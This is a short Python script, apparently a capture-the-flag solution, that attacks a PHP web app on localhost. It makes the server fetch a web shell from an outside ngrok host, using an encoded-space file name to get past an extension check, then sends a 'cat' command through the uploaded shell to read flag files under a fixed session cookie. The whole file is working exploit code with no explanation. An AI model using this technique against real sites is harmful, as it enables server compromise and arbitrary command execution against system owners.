import requests

link = 'https://d341-180-244-128-189.ngrok-free.app/shell.p%20hp'
url = f'http://localhost:8000/index.php?url={link}'
cmd = 'cat /var/www/flag*'
flag = f'http://localhost:8000/uploads/467456e9f46c3e641ae6afc15b478c87/gi0dylk3cxprcwj0dcpfft2q2zk8r5qh.php?cmd={cmd}'

cookie = {'PHPSESSID' : '467456e9f46c3e641ae6afc15b478c87'}

res = requests.post(url,cookies=cookie)
flag = requests.get(flag, cookies=cookie)
print(flag.text)